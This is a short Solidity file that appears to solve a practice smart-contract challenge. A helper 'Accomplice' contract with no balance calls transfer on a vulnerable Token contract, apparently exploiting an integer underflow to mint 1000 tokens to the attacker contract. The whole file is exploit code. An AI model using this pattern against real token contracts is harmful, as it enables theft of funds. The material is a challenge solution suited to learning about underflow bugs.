
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.6.0;
import "../../src/Token/Token.sol";
import "../../lib/forge-std/src/console.sol";

contract Accomplice {
    Token victim;
    address attacker;

    constructor(address _victim, address _attacker) public {
        victim = Token(payable(_victim));
        attacker = _attacker;
    }

    function executeTransfer() public {
        victim.transfer(attacker, 1000);
    }
}


contract TokenExploit {
    Token victim;
    Accomplice accomplice;

    constructor(address _victim) public {
        victim = Token(payable(_victim));
    }

    function hack() public {
        accomplice = new Accomplice(address(victim), address(this));
        accomplice.executeTransfer();
    }

    receive() external payable {
    }
}
